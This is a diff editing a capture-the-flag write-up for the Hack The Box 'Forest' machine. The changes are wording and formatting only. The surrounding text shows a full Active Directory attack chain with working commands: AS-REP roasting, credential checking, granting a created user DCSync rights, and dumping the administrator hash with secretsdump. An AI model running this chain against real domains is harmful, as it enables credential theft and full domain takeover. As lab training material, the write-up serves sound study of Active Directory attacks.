@@ -24,14 +24,14 @@ image:
 |3|Logged into the domain via WinRM|[evil-winrm](https://github.com/Hackplayers/evil-winrm)|Obtained initial foothold|
 |4|Credentialed domain enumeration|[SharpHound.py](https://github.com/BloodHoundAD/SharpHound), [BloodHound](https://github.com/BloodHoundAD/BloodHound)|Enumerated privilege escalation path|
 |5|Executed privileged escalation path|LOTL*|Created & added a domain user to the required groups|
-|6|Assiged user DCSync rights|[DCSync.py](https://github.com/n00py/DCSync)|Obtained //administrator//'s NTLMv2 hash|
+|6|Assiged user DCSync rights|[DCSync.py](https://github.com/n00py/DCSync)|Obtained _administrator_'s NTLMv2 hash|
 |7|DCSync attack|[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)|Compromised domain|
 
 *_[Living Off The Land](https://encyclopedia.kaspersky.com/glossary/lotl-living-off-the-land/)_
 
 ## Detailed attack chain reproduction steps
 
-Obtained the TGT ticket of of the **_svc-alfresco_** via a ASREPRoasting:
+Obtained the TGT ticket of **_svc-alfresco_** via **ASREPRoasting**:
 
 ```bash
 $ getnpusers -dc-ip 10.10.10.161 -request 'htb.local/'
@@ -56,7 +56,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:1f1...<REDACTED>...588:s<REDACTED>e
 <SNIP>
 ```
 
-The obtained credentials was subsequently confirmed to the domain using [NetExec](https://github.com/Pennyw0rth/NetExec):
+The obtained credentials was subsequently domain-confirmed via [NetExec](https://github.com/Pennyw0rth/NetExec):
 
 ```bash
 $ nxc smb 10.10.10.161 -u svc-alfresco -p s<REDACTED>e
@@ -103,8 +103,8 @@ Info: Download successful!
 ```
 
 Upon review, two issues stood out:
-  - _svc-alfresco_ was member of the _Account Operators_ group as a result of [group nesting](https://learn.microsoft.com/en-us/windows/win32/ad/nesting-a-group-in-another-group) (Figure 1)
-  - The _Windows Exchange Permissions_ group had _WriteDACL_ permissions over the _HTB.LOCAL_ domain, which means that its members can obtain **DCSync rights** (Figure 2)
+  - _svc-alfresco_ was member of the [**_Account Operators**_](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) group as a result of [**group nesting**](https://learn.microsoft.com/en-us/windows/win32/ad/nesting-a-group-in-another-group) (Figure 1)
+  - The _Windows Exchange Permissions_ group had _**WriteDACL**_ permissions over the _HTB.LOCAL_ domain, which means that its members can obtain **DCSync rights** (Figure 2)
 
 ![Figure 1: svc-alfresco is a part of the Account Operators group.](forest_account_operators.png)
 
@@ -125,7 +125,7 @@ The command completed successfully.
 The command completed successfully.
 ```
 
-The user was then assigned the DCSync rights:
+The user was then assigned the **DCSync rights**:
 
 ```bash
 $ sudo python3 DCSync.py -dc htb.local -t ''CN=hacker,CN=Users,DC=htb,DC=local'' ''htb.local\hacker:hack3r123''
@@ -143,7 +143,7 @@ Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra
 [*] Saved restore state to aclpwn-20240316-103635.restore
 ```
 
-The DCSync attack was performed and the _Administrator_'s NTLMv2 hash was obtained:
+The **DCSync attack** was performed and the _Administrator_'s NTLMv2 hash was obtained:
 
 ```bash
 $ sudo /opt/impacket/examples/secretsdump.py htb.local/hacker:hack3r123@10.10.10.161
